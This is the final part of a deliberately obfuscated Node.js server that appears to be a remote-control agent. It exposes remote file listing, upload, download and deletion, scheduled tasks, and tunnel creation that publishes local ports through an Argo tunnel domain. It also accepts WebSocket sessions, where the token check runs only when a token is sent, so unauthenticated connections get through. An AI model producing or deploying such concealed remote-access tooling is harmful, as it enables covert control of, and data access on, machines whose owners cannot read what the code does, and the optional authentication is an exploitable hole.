                const o = await a0W[fl(0x76b)](m['body'][fl(0x1e7)] || []);
                n[fl(0x493)]({
                    'status': 'ok',
                    'files': o
                });
            } catch (p) {
                n[fl(0x261)](0x1f4)[fl(0x493)]({
                    'status': fl(0x5e4),
                    'message': p['message']
                });
            }
        }), i[fa(0x42e)](fa(0x3a5), async (m, n) => {
            const fm = fa;
            try {
                const o = m[fm(0x696)][fm(0x510)] || {}, p = b[fm(0x3af)](m[fm(0x696)][fm(0x24d)], !![]), q = await a0W[fm(0x5c1)](o, p);
                n[fm(0x493)](q);
            } catch (r) {
                n[fm(0x261)](0x1f4)[fm(0x493)]({
                    'status': b['fzJxy'],
                    'message': r[fm(0x322)]
                });
            }
        }), i['post'](b[fa(0x25b)], async (m, n) => {
            const fn = fa;
            try {
                const o = await a0W[fn(0x429)](m[fn(0x696)]['path']);
                n[fn(0x493)](o);
            } catch (p) {
                n['status'](0x1f4)[fn(0x493)]({
                    'status': b[fn(0x16c)],
                    'message': p[fn(0x322)]
                });
            }
        }), i['post'](b[fa(0x269)], async (m, n) => {
            const fo = fa;
            try {
                const o = await a0W[fo(0x575)](m[fo(0x696)][fo(0x6aa)], m['body'][fo(0x272)], m[fo(0x696)][fo(0x6d5)], m[fo(0x696)][fo(0x148)], m[fo(0x696)]['total_chunks']);
                n[fo(0x493)](o);
            } catch (p) {
                n[fo(0x261)](0x1f4)[fo(0x493)]({
                    'status': fo(0x5e4),
                    'message': p[fo(0x322)]
                });
            }
        }), i[fa(0x139)](b['dASSJ'], a0f['raw']({
            'type': b[fa(0x324)],
            'limit': b[fa(0x39d)]
        }), async (m, n) => {
            const fp = fa;
            try {
                const o = b[fp(0x70d)](decodeURIComponent, m[fp(0x63c)][b[fp(0x6bf)]] || ''), p = b[fp(0x71e)](decodeURIComponent, m[fp(0x63c)][fp(0x145)] || ''), q = m['headers']['x-chunk-id'], r = m[fp(0x63c)][b['sSJph']];
                if (b[fp(0x413)](!o, !p))
                    return n['status'](0x190)[fp(0x493)]({
                        'status': b['fzJxy'],
                        'completed': ![],
                        'message': b[fp(0x3dd)]
                    });
                const s = b[fp(0x723)](q, undefined) ? b[fp(0x2e7)](parseInt, String(q), 0xa) : null, t = b[fp(0x723)](r, undefined) ? b[fp(0x2e7)](parseInt, b[fp(0x50d)](String, r), 0xa) : null, u = m[fp(0x696)];
                if (!Buffer[fp(0xc9)](u))
                    return n[fp(0x261)](0x190)['json']({
                        'status': b[fp(0x16c)],
                        'completed': ![],
                        'message': b['STwnC']
                    });
                const v = await a0W[fp(0x250)](o, p, u, s, t);
                n[fp(0x493)](v);
            } catch (w) {
                n[fp(0x261)](0x1f4)[fp(0x493)]({
                    'status': b['fzJxy'],
                    'completed': ![],
                    'message': w[fp(0x322)]
                });
            }
        }), i[fa(0x139)](b['PSwXD'], async (m, n) => {
            const fq = fa;
            try {
                const o = await a0W[fq(0x638)](m[fq(0x696)]['path']), p = Buffer['from'](o[fq(0x6d5)], 'base64');
                return n['set'](b['tIVWo'], o[fq(0x52c)][fq(0x496)]()), n[fq(0x5de)](b[fq(0x4bd)], o[fq(0x6aa)]), n['set'](b['QvJBG'], b[fq(0x324)]), n[fq(0x3a1)](p);
            } catch (q) {
                n[fq(0x261)](0x1f4)[fq(0x493)]({
                    'status': b['fzJxy'],
                    'message': q[fq(0x322)]
                });
            }
        }), i['delete'](b[fa(0x269)], async (m, n) => {
            const fr = fa;
            try {
                let o = m['body'][fr(0x1e7)];
                if (!o || !Array['isArray'](o)) {
                    o = [];
                    if (m[fr(0x696)][fr(0x6aa)])
                        o[fr(0x33a)](m[fr(0x696)][fr(0x6aa)]);
                    if (m[fr(0x696)][fr(0x235)])
                        o[fr(0x33a)](m['body'][fr(0x235)]);
                }
                const p = await a0W[fr(0x597)](o);
                n['json']({
                    'status': 'ok',
                    'results': p
                });
            } catch (q) {
                n[fr(0x261)](0x1f4)[fr(0x493)]({
                    'status': b[fr(0x16c)],
                    'message': q['message']
                });
            }
        }), i['put'](b[fa(0x269)], async (m, n) => {
            const ft = fa;
            try {
                const o = await a0W[ft(0x540)](m[ft(0x696)][ft(0x176)] || m[ft(0x696)]);
                n[ft(0x493)]({
                    'status': 'ok',
                    'total': o[ft(0x4a5)],
                    'success': o[ft(0x72f)](p => p['status'] === 'ok')[ft(0x4a5)],
                    'results': o
                });
            } catch (p) {
                n[ft(0x261)](0x1f4)[ft(0x493)]({
                    'status': b[ft(0x16c)],
                    'message': p[ft(0x322)]
                });
            }
        }), i[fa(0x139)](b[fa(0x123)], async (m, n) => {
            const fu = fa;
            try {
                const o = await a0W[fu(0x199)](m[fu(0x696)]);
                n['json']({
                    'status': 'ok',
                    'total': o[fu(0x4a5)],
                    'success': o[fu(0x72f)](p => p[fu(0x261)] === 'ok')[fu(0x4a5)],
                    'results': o
                });
            } catch (p) {
                n[fu(0x261)](0x1f4)[fu(0x493)]({
                    'status': fu(0x5e4),
                    'message': p[fu(0x322)]
                });
            }
        }), i['post'](b[fa(0x5df)], async (m, n) => {
            const fv = fa;
            try {
                const o = await a0W[fv(0x3de)](m['body'][fv(0x6aa)]);
                n[fv(0x493)](o);
            } catch (p) {
                n[fv(0x261)](0x1f4)[fv(0x493)]({
                    'status': b['fzJxy'],
                    'message': p[fv(0x322)]
                });
            }
        }), i['get'](b[fa(0x3c3)], (m, n) => {
            const fw = fa;
            n[fw(0x493)](a0X[fw(0x665)]());
        }), i[fa(0x139)](fa(0x219), async (m, n) => {
            const fx = fa;
            try {
                const o = await a0X['setOnetimeTasks'](m[fx(0x696)]);
                n[fx(0x493)](o);
            } catch (p) {
                n['status'](0x1f4)['json']({
                    'status': fx(0x5e4),
                    'message': p[fx(0x322)]
                });
            }
        }), i[fa(0x514)](b[fa(0x189)], (m, n) => {
            const fy = fa;
            n['json'](a0X[fy(0x6e2)]());
        }), i[fa(0x139)](b[fa(0x189)], (m, n) => {
            const fz = fa;
            try {
                const o = a0X['setCronTasks'](m[fz(0x696)]);
                n[fz(0x493)](o);
            } catch (p) {
                n[fz(0x261)](0x1f4)[fz(0x493)]({
                    'status': b[fz(0x16c)],
                    'message': p[fz(0x322)]
                });
            }
        }), i['get'](b[fa(0x6db)], (m, n) => {
            const fA = fa;
            n[fA(0x493)](a0X[fA(0x511)]());
        }), i['get'](fa(0x2a4), (m, n) => {
            const fB = fa;
            let o = b['btvMf'](parseInt, m[fB(0x1c0)][fB(0x561)], 0xa) || 0x32;
            o = Math['min'](Math['max'](o, 0x1), 0x64), n[fB(0x493)](a0X['getOnetimeLogs'](o));
        }), i[fa(0x514)](fa(0x2de), (m, n) => {
            const fC = fa;
            let o = b['NOMJm'](parseInt, m[fC(0x1c0)]['limit'], 0xa) || 0x32;
            o = Math[fC(0x360)](Math['max'](o, 0x1), 0x64), n[fC(0x493)](a0X[fC(0x4a7)](o));
        }), i['delete'](b['TISkN'], (m, n) => {
            const fD = fa;
            n[fD(0x493)](a0X[fD(0x724)]());
        }), i[fa(0x49d)](b['ZsyyT'], (m, n) => {
            const fE = fa;
            n['json'](a0X[fE(0x25a)]());
        }), i[fa(0x514)](b[fa(0x742)], (m, n) => {
            n['json'](a0X['getLogSummary']());
        }), i[fa(0x139)](fa(0x59b), async (m, n) => {
            const fF = fa;
            try {
                const o = await a0X[fF(0xdd)]();
                n['json'](o);
            } catch (p) {
                n['status'](0x1f4)[fF(0x493)]({
                    'status': b[fF(0x16c)],
                    'message': p[fF(0x322)]
                });
            }
        });
        const j = {
                'debug': (...m) => a0C[fa(0x1cc)](m[fa(0x211)]('\x20')),
                'info': (...m) => a0C[fa(0x6ea)](m[fa(0x211)]('\x20')),
                'warning': (...m) => a0C[fa(0x165)](m['join']('\x20'))
            }, k = new a0aF(j);
        i[fa(0x514)](b[fa(0x4d1)], (m, n) => {
            const fG = fa, o = k['list']();
            n['json']({
                'status': 'ok',
                'count': o[fG(0x4a5)],
                'tunnels': o
            });
        }), i['post'](b[fa(0x4d1)], async (m, n) => {
            const fH = fa;
            try {
                const o = b[fH(0x4f5)](a0aE, m['body']);
                let p = o[fH(0x2b8)];
                (p === undefined || b[fH(0x274)](p, null) || p === '') && (p = a0O['PORT']);
                const q = b[fH(0x451)](Number, p);
                if (!Number[fH(0x634)](q) || q < 0x1 || q > 0xffff)
                    return n[fH(0x261)](0x1a6)['json']({
                        'status': fH(0x5e4),
                        'created': ![],
                        'port': p,
                        'message': b[fH(0x1ae)]
                    });
                const r = await k[fH(0x353)](q, b[fH(0x499)](o[fH(0x171)], !![]));
                n['json']({
                    'status': 'ok',
                    'created': !![],
                    'tunnel_domain': r[fH(0x57c)],
                    'port': r[fH(0x2b8)],
                    'created_at': r[fH(0x6ac)]
                });
            } catch (s) {
                n[fH(0x261)](s[fH(0x261)] || 0x1f4)['json']({
                    'status': b[fH(0x16c)],
                    'created': ![],
                    'port': s[fH(0x2b8)] ?? null,
                    'message': s[fH(0x322)]
                });
            }
        }), i['delete'](b[fa(0x4d1)], async (m, n) => {
            const fI = fa;
            try {
                const o = b[fI(0x4f5)](a0aE, m[fI(0x696)]), p = o[fI(0x2b8)], q = b[fI(0x71e)](Number, p);
                if (b[fI(0x600)](p, undefined) || b[fI(0x3af)](p, null) || b['hYKga'](p, '') || !Number[fI(0x634)](q) || q < 0x1 || b['BHDHv'](q, 0xffff))
                    return n[fI(0x261)](0x1a6)[fI(0x493)]({
                        'status': 'error',
                        'deleted': 0x0,
                        'port': b[fI(0x711)](p, null),
                        'message': b[fI(0x765)]
                    });
                const r = await k['remove'](q, o[fI(0x544)]);
                if (b[fI(0x1b1)](r[fI(0x261)], 'ok'))
                    return n[fI(0x493)]({
                        'status': 'ok',
                        'deleted': r[fI(0x432)],
                        'port': q,
                        'tunnels': r[fI(0x74c)]
                    });
                return n[fI(0x261)](r[fI(0x261)])[fI(0x493)]({
                    'status': fI(0x5e4),
                    'deleted': 0x0,
                    'port': q,
                    'message': r[fI(0x322)]
                });
            } catch (s) {
                n[fI(0x261)](0x1f4)[fI(0x493)]({
                    'status': b[fI(0x16c)],
                    'deleted': 0x0,
                    'message': s[fI(0x322)]
                });
            }
        }), a0C[fa(0x1cc)](b[fa(0x505)]), i['ws'](fa(0x76d), async (m, n) => {
            const fJ = fa, o = n[fJ(0x291)][0x0];
            a0C[fJ(0x1cc)]('WebSocket\x20request\x20URL:\x20' + n['url']), a0C[fJ(0x1cc)](fJ(0x554) + o);
            const p = n['query']['request_id'], q = n[fJ(0x1c0)][fJ(0x140)];
            a0C[fJ(0x1cc)]('WebSocket\x20connection\x20attempt\x20with\x20request_id:\x20' + p);
            if (!p) {
                a0C[fJ(0x1cc)](fJ(0x63a)), m[fJ(0x63b)](0x3f0, fJ(0x2e1));
                return;
            }
            if (q) {
                const s = a0O[fJ(0xf8)](), t = Buffer[fJ(0x3e1)](b['LVWmD'](String, q), b[fJ(0x5b3)]), u = Buffer['from'](s, fJ(0x448)), v = b[fJ(0x1b1)](t[fJ(0x4a5)], u['length']) && a0k[fJ(0x5fc)](t, u);
                if (!v) {
                    a0C[fJ(0x165)](fJ(0xdb) + p + fJ(0x256)), m[fJ(0x63b)](0x3f0, b[fJ(0x410)]);
                    return;
                }
            }
            const r = new a0aM();
            await r[fJ(0x116)](m, p, q);
        }), a0C['debug'](b[fa(0x51e)]), a0C[fa(0x1cc)]('Starting\x20HTTP\x20server...');
        const l = i[fa(0x20c)](a0O[fa(0x2a2)], a0O['HOST'], () => {
            const fK = fa;
            a0C[fK(0x1cc)](fK(0x491) + a0O[fK(0x345)] + fK(0x467) + a0O['HOST'] + ':' + a0O['PORT']), a0C[fK(0x1cc)](b['oaEdk']), (b[fK(0x6f2)](a0O[fK(0x3f5)], '1') || a0O[fK(0x3f5)] === '2' && a0aG[fK(0x5dc)]()) && a0aG[fK(0x2bd)](k);
        });
        process['on'](b[fa(0x67c)], () => {
            const fL = fa;
            a0C[fL(0x1cc)](b[fL(0x677)]), l[fL(0x63b)](), process['exit'](0x0);
        }), a0C[fa(0x1cc)](fa(0x621));
    } catch (m) {
        a0C[fa(0x5e4)](b[fa(0x42f)], m), process[fa(0x45f)](0x1);
    }
}
(require[a0aQ(0x11c)] === module || require[a0aQ(0x11c)]?.[a0aQ(0x272)]?.[a0aQ(0x572)]('ts-node')) && a0aN()[a0aQ(0x6af)](a0C['error']);
module[a0aQ(0x357)] = {
    'main': a0aN,
    'Config': a0O,
    'CryptoManager': a0Q,
    'SystemInfoCollector': a0T,
    'CommandExecutor': a0U,
    'FileManager': a0W,
    'TaskManager': a0X,
    'ArgoTunnelManager': a0aF,
    'KModeController': a0aG
};